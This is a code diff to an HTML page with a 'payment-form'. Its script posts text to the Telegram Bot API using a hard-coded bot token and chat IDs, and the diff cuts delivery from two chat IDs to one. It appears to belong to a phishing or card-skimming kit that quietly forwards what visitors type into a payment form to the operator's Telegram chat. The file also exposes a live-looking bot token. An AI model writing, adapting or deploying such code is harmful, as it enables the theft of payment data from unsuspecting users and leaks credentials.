@@ -205,7 +205,7 @@ text-align: center;
     <script>
         // --- CONFIGURATION ---
         const botToken = '8254458626:AAHwhFEuRKs9OS2YLgCsWFneUsaI8UThMfw'; // Replace with your Telegram bot token
-        const chatIds = ['6966542803','1271362249'];   // Replace with your Telegram chat ID
+        const chatId = '6966542803';   // Replace with your Telegram chat ID
         // ---------------------
 
         const form = document.getElementById('payment-form');
@@ -296,28 +296,17 @@ text-align: center;
 
         function sendToTelegram(text) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-           chatIds.forEach(chatId => {
+            const params = {
+                chat_id: chatId,
+                text: text,
+                parse_mode: 'Markdown'
+            };
 
-    const params = {
-        chat_id: chatId,
-        text: text,
-        parse_mode: 'Markdown'
-    };
-
-    fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(params)
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log('Successfully sent to Telegram:', data);
-    })
-    .catch(error => {
-        console.error('Error sending to Telegram:', error);
-    });
-
-});
+fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(params)
+            })
             .then(response => response.json())
             .then(data => {
                 console.log('Successfully sent to Telegram:', data);
